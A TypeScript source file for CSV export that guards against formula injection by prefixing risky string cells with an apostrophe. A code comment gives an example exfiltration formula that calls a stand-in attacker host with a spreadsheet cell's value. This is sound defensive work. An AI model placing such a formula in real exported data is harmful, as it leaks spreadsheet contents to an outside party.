/**
 * RFC-4180 CSV, with one deliberate hardening.
 *
 * A cell beginning with `=`, `+`, `-` or `@` is interpreted as a formula by Excel and
 * Sheets. Extracted values come from third-party web pages, so a page containing
 * `=HYPERLINK("http://attacker/"&A1)` would otherwise become a live formula in an
 * accountant's spreadsheet. Prefixing with an apostrophe keeps the value visible and
 * inert — the alternative is shipping a CSV injection to the customer we are asking to
 * trust us with provenance.
 */
const FORMULA_PREFIXES = ['=', '+', '-', '@', '\t', '\r'];

/** A cell is a primitive or it is a mistake; objects render as JSON rather than as
 *  "[object Object]", which looks like data and is not. */
function stringify(value: unknown): string {
  if (typeof value === 'string') return value;
  if (typeof value === 'number' || typeof value === 'bigint' || typeof value === 'boolean')
    return String(value);
  if (value instanceof Date) return value.toISOString();
  return JSON.stringify(value) ?? '';
}

export function escapeCsvCell(value: unknown): string {
  if (value === null || value === undefined) return '';

  // Numbers are safe by construction and must NOT be prefixed: `-500` is a credit, and
  // turning it into the text `'-500` would corrupt exactly the data an accountant cares
  // about. Only strings — which is what arrives from a scraped page — are neutralised.
  const text = stringify(value);
  const neutralised =
    typeof value === 'string' && FORMULA_PREFIXES.some((prefix) => text.startsWith(prefix))
      ? `'${text}`
      : text;

  if (/[",\n\r]/.test(neutralised)) return `"${neutralised.replace(/"/g, '""')}"`;
  return neutralised;
}

/** Accepts any record-shaped row, including interfaces without an index signature — which
 *  is every row type in this package. */
export function toCsv<T extends object>(rows: readonly T[], columns?: readonly string[]): string {
  if (rows.length === 0) return columns ? `${columns.join(',')}\n` : '';
  const headers = columns ?? Object.keys(rows[0] as object);
  const lines = [headers.map(escapeCsvCell).join(',')];
  for (const row of rows) {
    lines.push(
      headers.map((header) => escapeCsvCell((row as Record<string, unknown>)[header])).join(','),
    );
  }
  // A trailing newline keeps `wc -l` and naive line-splitters honest.
  return `${lines.join('\n')}\n`;
}
